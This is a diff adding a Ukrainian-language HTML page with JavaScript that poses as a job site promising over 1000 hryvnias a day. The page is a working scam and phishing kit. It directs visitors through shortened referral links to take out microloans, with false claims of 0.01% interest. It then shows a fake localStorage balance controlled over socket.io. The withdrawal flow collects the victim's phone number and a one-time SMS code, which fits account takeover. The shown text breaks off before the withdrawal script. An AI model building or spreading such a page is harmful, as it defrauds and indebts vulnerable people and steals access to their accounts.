@@ -1,0 +1,1147 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>РоботаUA - Єдиний HTML (Баланс + Завдання)</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+    <style>
+        :root {
+            --primary-color: #007bff;
+            --accent-color: #28a745;
+            --text-color: #333;
+            --header-height: 80px;
+            --bg-start-color: #5d00a0;
+            --bg-mid-color: #0056b3;
+            --bg-end-color: #00b347;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            color: var(--text-color);
+            background: linear-gradient(135deg, var(--bg-start-color) 0%, var(--bg-mid-color) 50%, var(--bg-end-color) 100%);
+            background-attachment: fixed;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Шапка */
+        .header {
+            background-color: #ffffff;
+            height: var(--header-height);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            text-decoration: none;
+            color: var(--text-color);
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(90deg, #ffc107 0%, #007bff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-right: 10px;
+            background-size: 200% auto;
+            animation: text-shimmer 4s linear infinite;
+        }
+
+        @keyframes text-shimmer {
+            to { background-position: 200% center; }
+        }
+
+        .logo-icon-wrapper {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary-color);
+            font-size: 32px;
+        }
+
+        /* Баланс */
+        .balance-info {
+            display: flex;
+            align-items: center;
+            padding: 8px 15px;
+            border-radius: 5px;
+            background-color: #e9f7ef;
+            transition: transform 0.3s ease;
+        }
+
+        .balance-info:hover {
+            transform: scale(1.05);
+            background-color: #d4edda;
+        }
+
+        .balance-info span {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-color);
+        }
+
+        .balance-amount {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--accent-color);
+            margin-left: 5px;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.15); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .pulsing-icon {
+            animation: pulse 1.5s infinite ease-in-out;
+            filter: drop-shadow(0 0 5px var(--primary-color));
+        }
+
+        /* Контент */
+        .content {
+            padding: 20px;
+            color: #ffffff;
+            text-align: center;
+        }
+
+        .content h1 {
+            font-size: 18px;
+            font-weight: 800;
+            margin-top: 50px;
+            margin-bottom: 40px;
+            line-height: 1.2;
+            text-transform: uppercase;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .content h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            color: #ffc107;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.8);
+        }
+
+        .content ul {
+            list-style: none;
+            padding: 0;
+            max-width: 550px;
+            margin: 20px auto;
+            text-align: left;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .content ul li {
+            font-size: 19px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            padding: 10px 15px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            display: flex;
+            align-items: center;
+            opacity: 0;
+            animation: fadeIn 0.8s forwards;
+        }
+
+        .content ul li:nth-child(1) { animation-delay: 0.2s; }
+        .content ul li:nth-child(2) { animation-delay: 0.4s; }
+        .content ul li:nth-child(3) { animation-delay: 0.6s; }
+        .content ul li:nth-child(4) { animation-delay: 0.8s; }
+
+        .content ul li i.material-icons {
+            font-size: 28px;
+            margin-right: 15px;
+            color: var(--accent-color);
+            filter: drop-shadow(0 0 3px rgba(0, 0, 0, 0.5));
+        }
+
+        @keyframes icon-pulse {
+            0% { color: var(--accent-color); transform: scale(1); }
+            50% { color: #ffc107; transform: scale(1.1); }
+            100% { color: var(--accent-color); transform: scale(1); }
+        }
+
+        .content ul li:first-child i.material-icons { animation: icon-pulse 2s infinite ease-in-out; }
+        .content ul li:nth-child(3) i.material-icons { animation: icon-pulse 2.5s infinite ease-in-out reverse; }
+
+        /* Кнопки */
+        .button-group {
+            margin-top: 50px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            align-items: center;
+        }
+
+        .btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 280px;
+            padding: 12px 25px;
+            font-size: 18px;
+            font-weight: 700;
+            text-decoration: none;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.4);
+        }
+
+        .btn i.material-icons {
+            margin-right: 8px;
+            font-size: 22px;
+        }
+
+        .btn-start { background: linear-gradient(90deg, #28a745 0%, #1e7e34 100%); }
+        .btn-start:hover { transform: translateY(-2px) scale(1.03); box-shadow: 0 8px 15px rgba(40, 167, 69, 0.6); }
+
+        .btn-reviews { background: linear-gradient(90deg, #ffc107 0%, #e0a800 100%); color: #333; }
+        .btn-reviews:hover { transform: translateY(-2px) scale(1.03); box-shadow: 0 8px 15px rgba(255, 193, 7, 0.6); }
+
+        .btn-withdraw { background: linear-gradient(90deg, #007bff 0%, #0056b3 100%); }
+        .btn-withdraw:hover { transform: translateY(-2px) scale(1.03); box-shadow: 0 8px 15px rgba(0, 123, 255, 0.6); }
+
+        /* Модальні вікна */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.7);
+            backdrop-filter: blur(5px);
+            padding: 20px 0;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* Модальні вікна (показувати з flex) */
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            padding: 15px; /* Уменьшено */
+            border-radius: 12px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            position: relative;
+            max-height: 85vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-header {
+            position: relative;
+            padding-bottom: 10px; /* Уменьшено */
+            border-bottom: 3px solid var(--accent-color);
+            margin-bottom: 10px; /* Уменьшено */
+        }
+
+        .modal-content h3 {
+            font-size: 20px; /* Уменьшено */
+            font-weight: 800;
+            color: var(--primary-color);
+            text-align: center;
+            margin: 0;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: -10px;
+            right: 10px;
+            color: #aaa;
+            font-size: 40px;
+            font-weight: bold;
+            line-height: 1;
+            cursor: pointer;
+            transition: color 0.2s;
+            z-index: 10;
+        }
+
+        .close-btn:hover { color: #dc3545; }
+
+        /* Завдання */
+        .tasks-container, .reviews-container, .modal-body {
+            max-height: 65vh;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+
+        .task-item {
+            background: linear-gradient(135deg, #f8fffe 0%, #e8f5e9 100%);
+            border: 2px solid var(--accent-color);
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 12px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .task-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(40, 167, 69, 0.2);
+        }
+
+        .task-title {
+            font-size: 20px;
+            font-weight: 800;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+
+        .task-reward {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--accent-color);
+            margin: 12px 0;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
+        }
+
+        .task-description {
+            font-size: 16px;
+            color: #444;
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+
+        .btn-task-start {
+            background: linear-gradient(90deg, #28a745 0%, #1e7e34 100%);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 8px rgba(40, 167, 69, 0.4);
+        }
+
+        .btn-task-start:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 15px rgba(40, 167, 69, 0.6);
+        }
+
+        /* Інструкція */
+        .instruction-content {
+            line-height: 1.4; /* Уменьшено */
+            font-size: 15px; /* Уменьшено */
+            color: #333;
+            margin-bottom: 10px; /* Уменьшено */
+        }
+
+        .instruction-content strong {
+            color: #d32f2f;
+            font-weight: 800;
+        }
+
+        .instruction-content ol {
+            padding-left: 15px; /* Уменьшено */
+            margin: 0;
+            font-weight: 700; /* Зробимо жирним текст списку */
+        }
+        
+        .instruction-content ol strong {
+             color: #d32f2f; /* Колір для важливого тексту в інструкції */
+        }
+
+        .instruction-content li {
+            margin-bottom: 6px; /* Уменьшено */
+        }
+
+        .screenshot-form {
+            margin-top: 10px; /* Уменьшено */
+            padding: 10px; /* Уменьшено */
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px dashed #28a745;
+        }
+
+        .screenshot-input {
+            /* Приховуємо стандартний інпут, щоб стилізувати label */
+            display: none; 
+        }
+        
+        /* Стилізація кастомної кнопки для завантаження файлу */
+        .custom-file-upload {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            margin-top: 5px;
+            border: 2px dashed #007bff;
+            border-radius: 8px;
+            background: #fff;
+            font-size: 14px;
+            text-align: center;
+            cursor: pointer;
+            color: var(--primary-color);
+            font-weight: 700;
+            transition: background-color 0.3s;
+        }
+
+        .custom-file-upload:hover {
+            background-color: #e6f0ff;
+        }
+        
+        .btn-check, .btn-action {
+            margin-top: 10px; /* Уменьшено */
+            width: 100%;
+            background: linear-gradient(90deg, #ff6d00 0%, #c43e00 100%);
+            padding: 10px; /* Уменьшено */
+            font-size: 16px; /* Уменьшено */
+            font-weight: 700;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        
+        .btn-action {
+             background: linear-gradient(90deg, #007bff 0%, #0056b3 100%);
+        }
+
+        .btn-check:hover {
+            background: linear-gradient(90deg, #c43e00 0%, #ff6d00 100%);
+        }
+        
+        .btn-action:hover {
+            background: linear-gradient(90deg, #0056b3 0%, #007bff 100%);
+        }
+
+        /* Стилі для відгуків */
+        .review-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            border-left: 5px solid var(--accent-color);
+        }
+
+        .review-author {
+            font-weight: 800;
+            color: var(--primary-color);
+            font-size: 18px;
+        }
+
+        .review-text {
+            margin-top: 8px;
+            font-size: 16px;
+            color: #333;
+        }
+        
+        /* Стилі для таймера */
+        #timerDisplay {
+            font-size: 48px;
+            font-weight: 800;
+            color: var(--primary-color);
+            text-align: center;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
+        }
+        
+        .timer-text {
+            font-size: 18px;
+            text-align: center;
+            color: #333;
+            line-height: 1.5;
+        }
+        
+        /* Стилі для форм виводу */
+        .form-group {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 16px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            box-sizing: border-box; /* Важливо для padding */
+        }
+        
+        .form-group input:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 8px rgba(0,123,255,0.3);
+        }
+        
+        .success-text {
+            font-size: 18px;
+            color: var(--accent-color);
+            font-weight: 700;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        /* Оптимизация для мобильных */
+        @media (max-width: 480px) {
+            .header {
+                padding: 0 10px;
+            }
+            .logo-text {
+                font-size: 24px;
+            }
+            .balance-info span {
+                font-size: 14px;
+            }
+            .balance-amount {
+                font-size: 18px;
+            }
+            .content h1 {
+                font-size: 16px;
+                margin-top: 30px;
+                margin-bottom: 30px;
+            }
+            .content h2 {
+                font-size: 20px;
+            }
+            .content ul li {
+                font-size: 16px;
+                padding: 8px 12px;
+            }
+            .btn {
+                font-size: 16px;
+                padding: 10px 20px;
+                max-width: 100%;
+            }
+            .modal-content {
+                padding: 10px;
+                max-height: 90vh;
+            }
+            .modal-content h3 {
+                font-size: 18px;
+            }
+            .instruction-content {
+                font-size: 14px;
+            }
+            .instruction-content li {
+                margin-bottom: 4px;
+            }
+            .screenshot-form {
+                margin-top: 8px;
+                padding: 8px;
+            }
+            #timerDisplay {
+                font-size: 36px;
+            }
+        }
+
+        /* Кросс-браузерные фиксы */
+        * {
+            box-sizing: border-box;
+        }
+        /* Встановлено display: none для input[type="file"] та стилізовано кастомну кнопку вище */
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="#" class="logo">
+            <span class="logo-text">РоботаUA</span>
+            <span class="logo-icon-wrapper">
+                <i class="material-icons pulsing-icon">paid</i>
+            </span>
+        </a>
+
+        <div class="balance-info">
+            <span>Баланс:</span>
+            <span class="balance-amount" id="balanceAmount">0.00 грн</span>
+        </div>
+    </header>
+
+    <main class="content">
+        <h1>Почни заробляти від 1000 гривень на день за виконання простих завдань</h1>
+        
+        <h2>Наш сервіс пропонує вам:</h2>
+        
+        <ul>
+            <li><i class="material-icons">payments</i> Виплати кожного дня на вашу картку</li>
+            <li><i class="material-icons">attach_money</i> <strong>Від 500 грн за одне завдання</strong></li>
+            <li><i class="material-icons">work</i> Від 15 до 20 завдань на день</li>
+            <li><i class="material-icons">thumb_up</i> Більше 1000 відгуків наших робітників</li>
+        </ul>
+        
+        <div class="button-group">
+            <button class="btn btn-start" id="openTasksModal">
+                <i class="material-icons">trending_up</i> Почати заробляти
+            </button>
+            <button class="btn btn-reviews" id="openReviewsModal">
+                <i class="material-icons">comment</i> Відгуки
+            </button>
+            <button class="btn btn-withdraw" id="openWithdrawModal">
+                <i class="material-icons">account_balance_wallet</i> Вивести кошти
+            </button>
+        </div>
+    </main>
+
+    <div id="tasksModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Доступні завдання</h3>
+                <span class="close-btn">×</span>
+            </div>
+            <div class="tasks-container">
+                <div class="task-item" data-link="https://tinyurl.com/yfnmpke6" data-reward="800">
+                    <div class="task-title">Завдання №1 – Пройти реєстрацію та стати рефералом на мікрофінансовому сайті</div>
+                    <div class="task-reward">+800 гривень</div>
+                    <div class="task-description">
+                        Зареєструватись за нашим реферальним посиланням на перевіреному мікрофінансовому сайті та стати рефералом. Після виконання миттєва виплата на ваш баланс — 800 грн<br><br>
+                        <strong>Щоб взяти в роботу натисни «Почати виконувати» та читайте уважно інструкцію</strong>
+                    </div>
+                    <button class="btn-task-start open-instruction">
+                        <i class="material-icons">play_arrow</i> Почати виконувати
+                    </button>
+                </div>
+                <div class="task-item" data-link="https://tinyurl.com/57z2wdns" data-reward="1100">
+                    <div class="task-title">Завдання №2 – Пройти реєстрацію та стати рефералом на мікрофінансовому сайті</div>
+                    <div class="task-reward">+1100 гривень</div>
+                    <div class="task-description">
+                        Зареєструватись за нашим реферальним посиланням на перевіреному мікрофінансовому сайті та стати рефералом. Після виконання миттєва виплата на ваш баланс — 1100 грн<br><br>
+                        <strong>Щоб взяти в роботу натисни «Почати виконувати» та читайте уважно інструкцію</strong>
+                    </div>
+                    <button class="btn-task-start open-instruction">
+                        <i class="material-icons">play_arrow</i> Почати виконувати
+                    </button>
+                </div>
+
+                <div class="task-item" data-link="https://tinyurl.com/mt788nh6" data-reward="980">
+                    <div class="task-title">Завдання №3 – Пройти реєстрацію та стати рефералом на мікрофінансовому сайті</div>
+                    <div class="task-reward">+980 гривень</div>
+                    <div class="task-description">
+                        Зареєструватись за нашим реферальним посиланням на перевіреному мікрофінансовому сайті та стати рефералом. Після виконання миттєва виплата на ваш баланс — 980 грн<br><br>
+                        <strong>Щоб взяти в роботу натисни «Почати виконувати» та читайте уважно інструкцію</strong>
+                    </div>
+                    <button class="btn-task-start open-instruction">
+                        <i class="material-icons">play_arrow</i> Почати виконувати
+                    </button>
+                </div>
+
+                <div class="task-item" data-link="https://tinyurl.com/95tn4nrb" data-reward="760">
+                    <div class="task-title">Завдання №4 – Пройти реєстрацію та стати рефералом на мікрофінансовому сайті</div>
+                    <div class="task-reward">+760 гривень</div>
+                    <div class="task-description">
+                        Зареєструватись за нашим реферальним посиланням на перевіреному мікрофінансовому сайті та стати рефералом. Після виконання миттєва виплата на ваш баланс — 760 грн<br><br>
+                        <strong>Щоб взяти в роботу натисни «Почати виконувати» та читайте уважно інструкцію</strong>
+                    </div>
+                    <button class="btn-task-start open-instruction">
+                        <i class="material-icons">play_arrow</i> Почати виконувати
+                    </button>
+                </div>
+
+                <div class="task-item" data-link="https://tinyurl.com/5afd3w72" data-reward="1300">
+                    <div class="task-title">Завдання №5 – Пройти реєстрацію та стати рефералом на мікрофінансовому сайті</div>
+                    <div class="task-reward">+1300 гривень</div>
+                    <div class="task-description">
+                        Зареєструватись за нашим реферальним посиланням на перевіреному мікрофінансовому сайті та стати рефералом. Після виконання миттєва виплата на ваш баланс — 1300 грн<br><br>
+                        <strong>Щоб взяти в роботу натисни «Почати виконувати» та читайте уважно інструкцію</strong>
+                    </div>
+                    <button class="btn-task-start open-instruction">
+                        <i class="material-icons">play_arrow</i> Почати виконувати
+                    </button>
+                </div>
+
+                <div class="task-item" data-link="https://tinyurl.com/3wukz6ph" data-reward="700">
+                    <div class="task-title">Завдання №6 – Пройти реєстрацію та стати рефералом на мікрофінансовому сайті</div>
+                    <div class="task-reward">+700 гривень</div>
+                    <div class="task-description">
+                        Зареєструватись за нашим реферальним посиланням на перевіреному мікрофінансовому сайті та стати рефералом. Після виконання миттєва виплата на ваш баланс — 700 грн<br><br>
+                        <strong>Щоб взяти в роботу натисни «Почати виконувати» та читайте уважно інструкцію</strong>
+                    </div>
+                    <button class="btn-task-start open-instruction">
+                        <i class="material-icons">play_arrow</i> Почати виконувати
+                    </button>
+                </div>
+
+                <div class="task-item" data-link="https://tinyurl.com/bddvdcfz" data-reward="900">
+                    <div class="task-title">Завдання №7 – Пройти реєстрацію та стати рефералом на мікрофінансовому сайті</div>
+                    <div class="task-reward">+900 гривень</div>
+                    <div class="task-description">
+                        Зареєструватись за нашим реферальним посиланням на перевіреному мікрофінансовому сайті та стати рефералом. Після виконання миттєва виплата на ваш баланс — 900 грн<br><br>
+                        <strong>Щоб взяти в роботу натисни «Почати виконувати» та читайте уважно інструкцію</strong>
+                    </div>
+                    <button class="btn-task-start open-instruction">
+                        <i class="material-icons">play_arrow</i> Почати виконувати
+                    </button>
+                </div>
+
+                <div class="task-item" data-link="https://tinyurl.com/mu4nzesp" data-reward="680">
+                    <div class="task-title">Завдання №8 – Пройти реєстрацію та стати рефералом на мікрофінансовому сайті</div>
+                    <div class="task-reward">+680 гривень</div>
+                    <div class="task-description">
+                        Зареєструватись за нашим реферальним посиланням на перевіреному мікрофінансовому сайті та стати рефералом. Після виконання миттєва виплата на ваш баланс — 680 грн<br><br>
+                        <strong>Щоб взяти в роботу натисни «Почати виконувати» та читайте уважно інструкцію</strong>
+                    </div>
+                    <button class="btn-task-start open-instruction">
+                        <i class="material-icons">play_arrow</i> Почати виконувати
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="instructionModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Інструкція до завдання</h3>
+                <span class="close-btn">×</span>
+            </div>
+            <div class="instruction-content modal-body">
+                <p><strong>❗️ Увага! Вкладень не потребує! Всі позики під 0.01%. Ви нічого не втрачаєте ❗️<br>Позику можна закрити зразу після виконання завдання</strong></p>
+                <ol>
+                    <li>Переходимо за посиланням: <a href="#" id="dynamicLink" target="_blank" style="color:#007bff; font-weight:700;"></a></li>
+                    <li>Проходимо реєстрацію.</li>
+                    <li>Для того щоб стати рефералом оформлюємо маленьку позику <strong>від 500 гривень на 7 днів</strong>.</li>
+                    <li>Після схвалення позики <strong>завантажуємо скріншот, що позику схвалено</strong>, нижче та тиснемо перевірити виконання.</li>
+                    <li>Обов'язково <strong>кошти з позики треба отримати на картку</strong>.</li>
+                    <li>Після перевірки ви отримаєте на баланс виплату <span id="dynamicReward">800</span> грн та зможете вивести їх на картку.</li>
+                </ol>
+
+                <div class="screenshot-form">
+                    <p><strong>Скріншот підтвердження:</strong></p>
+                    <input type="file" accept="image/*" class="screenshot-input" id="screenshotFile">
+                    <label for="screenshotFile" class="custom-file-upload" id="fileUploadLabel">
+                         Натисни, щоб завантажити скріншот 
+                    </label>
+                </div>
+
+                <button class="btn-check" id="submitTask">
+                    <i class="material-icons">check_circle</i> Перевірити виконання
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="timerModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Завдання на перевірці</h3>
+            </div>
+            <div class="modal-body" style="text-align: center;">
+                <p class="timer-text">Будь ласка, зачекайте. Адміністратор перевіряє ваш скріншот.</p>
+                <div id="timerDisplay">30:00</div>
+                <p class="timer-text">Це може зайняти до 30 хвилин. Ви отримаєте сповіщення про результат.</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="reviewsModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Відгуки наших робітників</h3>
+                <span class="close-btn">×</span>
+            </div>
+            <div class="reviews-container" id="reviewsList"></div>
+        </div>
+    </div>
+    
+    <div id="withdrawModal1" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Виведення коштів</h3>
+                <span class="close-btn">×</span>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label for="phoneInput">Введіть номер телефону</label>
+                    <input type="tel" id="phoneInput" placeholder="+380 99 123 45 67" value="+380 ">
+                </div>
+                <button class="btn-action" id="submitPhoneBtn">Продовжити</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="withdrawModal2" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Підтвердження</h3>
+                <span class="close-btn">×</span>
+            </div>
+            <div class="modal-body">
+                <p style="text-align: center; font-size: 16px; color: #333;">Підтвердіть вивід, введіть одноразовий SMS код.</p>
+                <div class="form-group">
+                    <label for="codeInput">SMS Код</label>
+                    <input type="text" id="codeInput" placeholder="123456">
+                </div>
+                <button class="btn-action" id="submitCodeBtn">Підтвердити</button>
+            </div>
+        </div>
+    </div>
+    
+    <div id="withdrawModal3" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Заявка прийнята</h3>
+                <span class="close-btn">×</span>
+            </div>
+            <div class="modal-body">
+                <p class="success-text">
+                    ✅ Заявка на вивід подана! <br>З вами зв'яжеться менеджер для уточнення деталей.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // == ГЛОБАЛЬНІ ЗМІННІ ==
+            const socket = io();
+            let currentBalance = 0.00;
+            let currentTaskTitle = '';
+            let currentReward = 0;
+            let timerInterval;
+
+            // == ЕЛЕМЕНТИ DOM ==
+            const balanceElement = document.getElementById('balanceAmount');
+            
+            const tasksModal = document.getElementById('tasksModal');
+            const instructionModal = document.getElementById('instructionModal');
+            const reviewsModal = document.getElementById('reviewsModal');
+            const timerModal = document.getElementById('timerModal');
+            const withdrawModal1 = document.getElementById('withdrawModal1');
+            const withdrawModal2 = document.getElementById('withdrawModal2');
+            const withdrawModal3 = document.getElementById('withdrawModal3');
+
+            const openTasksBtn = document.getElementById('openTasksModal');
+            const openReviewsBtn = document.getElementById('openReviewsModal');
+            const openWithdrawBtn = document.getElementById('openWithdrawModal');
+            
+            const submitTaskBtn = document.getElementById('submitTask');
+            const submitPhoneBtn = document.getElementById('submitPhoneBtn');
+            const submitCodeBtn = document.getElementById('submitCodeBtn');
+
+            const dynamicLink = document.getElementById('dynamicLink');
+            const dynamicReward = document.getElementById('dynamicReward');
+            const timerDisplay = document.getElementById('timerDisplay');
+            
+            const screenshotFile = document.getElementById('screenshotFile');
+            const fileUploadLabel = document.getElementById('fileUploadLabel');
+
+
+            // == ЛОГІКА БАЛАНСУ (LocalStorage) ==
+            function loadBalance() {
+                const savedBalance = localStorage.getItem('userBalance');
+                if (savedBalance) {
+                    currentBalance = parseFloat(savedBalance);
+                } else {
+                    currentBalance = 0.00;
+                }
+                updateBalanceUI();
+            }
+
+            function updateBalanceUI() {
+                balanceElement.textContent = `${currentBalance.toFixed(2)} грн`;
+            }
+
+            function saveBalance(newBalance) {
+                currentBalance = newBalance;
+                localStorage.setItem('userBalance', currentBalance.toFixed(2));
+                updateBalanceUI();
+            }
+
+            loadBalance(); // Завантажуємо баланс при старті
+
+            // == ЛОГІКА SOCKET.IO ==
+            socket.on('balanceUpdate', (reward) => {
+                stopTimer();
+                timerModal.classList.remove('show');
+                
+                const rewardAmount = parseFloat(reward);
+                saveBalance(currentBalance + rewardAmount);
+                
+                alert(`✅ Завдання виконано! \nНа ваш баланс зараховано ${rewardAmount} грн.`);
+            });
+
+            socket.on('taskRejected', (reason) => {
+                stopTimer();
+                timerModal.classList.remove('show');
+                alert(`❌ Завдання відхилено. \nПричина: ${reason}`);
+            });
+            
+            // == ЛОГІКА ТАЙМЕРА ==
+            function startTimer() {
+                let duration = 30 * 60;
+                timerModal.classList.add('show');
+
+                const updateDisplay = () => {
+                    if (duration <= 0) {
+                        timerDisplay.textContent = "00:00";
+                        stopTimer();
+                        return;
+                    }
+
+                    let minutes = Math.floor(duration / 60);
+                    let seconds = duration % 60;
+                    minutes = minutes < 10 ? "0" + minutes : minutes;
+                    seconds = seconds < 10 ? "0" + seconds : seconds;
+                    timerDisplay.textContent = minutes + ":" + seconds;
+
+                    duration--;
+                };
+
+                updateDisplay(); // Показати 30:00 спочатку
+                timerInterval = setInterval(updateDisplay, 1000);
+            }
+
+            function stopTimer() {
+                clearInterval(timerInterval);
+            }
+
+            // == ЛОГІКА МОДАЛЬНИХ ВІКОН (Загальна) ==
+            function openModal(modal) {
+                modal.classList.add('show');
+            }
+
+            function closeModal(modal) {
+                modal.classList.remove('show');
+            }
+
+            openTasksBtn.onclick = () => openModal(tasksModal);
+            openReviewsBtn.onclick = () => {
+                renderReviews();
+                openModal(reviewsModal);
+            };
+            
+            openWithdrawBtn.onclick = () => {
+                if (currentBalance <= 0) {
+                    alert('Ваш баланс порожній. Виконайте завдання, щоб заробити.');
+                    return;
+                }
+                openModal(withdrawModal1);
+            };
+
+            // Обробники кнопок "Відкрити інструкцію"
+            document.querySelectorAll('.open-instruction').forEach(btn => {
+                btn.onclick = function() {
+                    const taskItem = this.closest('.task-item');
+                    const link = taskItem.getAttribute('data-link');
+                    const reward = taskItem.getAttribute('data-reward');
+                    const title = taskItem.querySelector('.task-title').textContent;
+
+                    currentTaskTitle = title;
+                    currentReward = reward;
+
+                    dynamicLink.href = link;
+                    dynamicLink.textContent = link;
+                    dynamicReward.textContent = reward;
+
+                    // Скидаємо інпут та лейбл при відкритті
+                    screenshotFile.value = ''; 
+                    fileUploadLabel.textContent = 'Натисни, щоб завантажити скріншот';
+
+                    closeModal(tasksModal);
+                    openModal(instructionModal);
+                };
+            });
+            
+            // Оновлення тексту кнопки завантаження файлу
+            screenshotFile.addEventListener('change', function() {
+                if (this.files.length > 0) {
+                    fileUploadLabel.textContent = `Файл обрано: ${this.files[0].name}`;
+                } else {
+                    fileUploadLabel.textContent = 'Натисни, щоб завантажити скріншот';
+                }
+            });
+
+
+            // Обробники кнопок "Закрити"
+            document.querySelectorAll('.close-btn').forEach(btn => {
+                btn.onclick = function() {
+                    const modal = this.closest('.modal');
+                    closeModal(modal);
+                };
+            });
+
+            // Закриття по кліку на фон
+            window.onclick = function(e) {
+                if (e.target.classList.contains('modal')) {
+                    closeModal(e.target);
+                }
+            };
+            
+            // == ЛОГІКА ВІДПРАВКИ ЗАВДАННЯ ==
+            submitTaskBtn.onclick = () => {
+                const file = screenshotFile.files[0];
+                if (!file) {
+                    alert('Завантажте скріншот!');
+                    return;
+                }
+                
+                // Конвертуємо файл в base64
+                const reader = new FileReader();
+                reader.readAsDataURL(file);
+                reader.onload = () => {
+                    const base64File = reader.result;
+                    
+                    // Надсилаємо дані на сервер
+                    socket.emit('submitTask', {
+                        title: currentTaskTitle,
+                        reward: currentReward,
+                        file: base64File // Відправляємо base64 рядок
+                    });
+                    
+                    // Ховаємо інструкцію і запускаємо таймер
+                    closeModal(instructionModal);
+                    startTimer();
+                    
+                    screenshotFile.value = ''; // Скидаємо інпут
+                    fileUploadLabel.textContent = 'Натисни, щоб завантажити скріншот'; // Скидаємо лейбл
+                };
+                reader.onerror = (error) => {
+                    console.error('Помилка читання файлу:', error);
+                    alert('Не вдалося завантажити скріншот. Спробуйте ще раз.');
+                };
+            };
+            
+            // == ЛОГІКА ВИВЕДЕННЯ КОШТІВ ==
